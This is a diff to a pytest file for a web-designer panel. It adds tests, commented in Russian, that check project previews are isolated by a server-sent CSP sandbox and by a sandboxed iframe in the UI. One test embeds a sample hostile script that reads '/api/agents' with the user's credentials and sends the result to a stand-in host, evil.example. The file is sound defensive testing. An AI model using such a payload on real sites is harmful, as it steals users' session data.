@@ -5,6 +5,8 @@
 """
 from __future__ import annotations
 
+import re
+
 import pytest
 
 from bcc.web_designer_dom import (
@@ -204,3 +206,44 @@ async def test_list_and_delete_project(env):
     assert deleted.status_code == 200
     gone = await env.client.get(f"/api/web-designer/projects/{pid}")
     assert gone.status_code == 404
+
+
+# ------------------------------------------------- изоляция превью (P0)
+
+async def test_preview_of_hostile_code_cannot_reach_the_panel(env):
+    """Превью — чужой код на origin панели. Без песочницы скрипт внутри него
+    прочитал бы CSRF-токен из localStorage и пошёл бы с cookie сессии в /api,
+    вплоть до terminal.run. Ограничение обязано приходить С СЕРВЕРА: атрибут
+    iframe можно забыть, заголовок — нет."""
+    data = await _create(env)
+    pid = data["meta"]["id"]
+    hostile = ("<!doctype html><html><body><h1>визитка</h1>"
+               "<script>fetch('/api/agents',{credentials:'include'})"
+               ".then(r=>r.text()).then(t=>fetch('https://evil.example/'+encodeURIComponent(t)));"
+               "</script></body></html>")
+    res = await env.client.put(f"/api/web-designer/projects/{pid}/code",
+                               json={"html": hostile, "note": "вставлен чужой код"})
+    assert res.status_code == 200, res.text
+
+    preview = await env.client.get(f"/api/web-designer/projects/{pid}/preview")
+    assert preview.status_code == 200
+    csp = preview.headers.get("content-security-policy", "")
+    # непрозрачный origin: ни cookie, ни localStorage, ни /api из кадра
+    assert "sandbox allow-scripts" in csp
+    assert "allow-same-origin" not in csp
+    assert preview.headers.get("x-content-type-options") == "nosniff"
+    # код сохранён как есть — панель ничего не «чистит» втихую и не притворяется,
+    # что обезвредила скрипт: он просто исполняется в песочнице
+    assert "evil.example" in preview.text
+
+
+def test_preview_iframe_is_sandboxed_in_the_ui():
+    """Вторая половина того же инварианта: кадр в UI объявлен песочницей и
+    сообщения принимаются только от него самого."""
+    from pathlib import Path
+    page = (Path(__file__).resolve().parents[1] / "ui" / "pages" / "web_designer.js").read_text(encoding="utf-8")
+    # значение атрибута, а не текст файла: слова «allow-same-origin» законно
+    # встречаются в комментарии, который объясняет, почему его там нет
+    values = re.findall(r"sandbox:\s*'([^']*)'", page)
+    assert values == ["allow-scripts"], values
+    assert "ev.source !== frame.contentWindow" in page
